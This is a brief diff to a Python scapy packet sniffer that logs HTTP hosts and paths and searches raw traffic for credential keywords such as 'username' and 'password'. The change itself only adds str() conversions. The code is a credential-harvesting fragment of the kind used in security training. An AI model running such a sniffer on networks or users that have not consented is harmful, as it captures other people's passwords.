@@ -7,18 +7,18 @@ def sniff(interface, process_packet):
 
 def get_url(packet):
     if packet.haslayer(http.HTTPRequest):
-        print("[+] HTTP Request Host >> " + packet[http.HTTPRequest].Host )
-        print("[+] HTTP Request Path >> " + packet[http.HTTPRequest].Path)
+        print("[+] HTTP Request Host >> " + str(packet[http.HTTPRequest].Host))
+        print("[+] HTTP Request Path >> " + str(packet[http.HTTPRequest].Path))
     else:
         print("[-] No HTTP Request detected.")
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
+        load = str(packet[scapy.Raw].load)
         keywords = ["username", "user", "password", "login", "pass"]
         for keyword in keywords:
             if keyword in load:
-                print("[+] Possible username/password >> " + load)
+                print("[+] Possible username/password >> " +load)
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
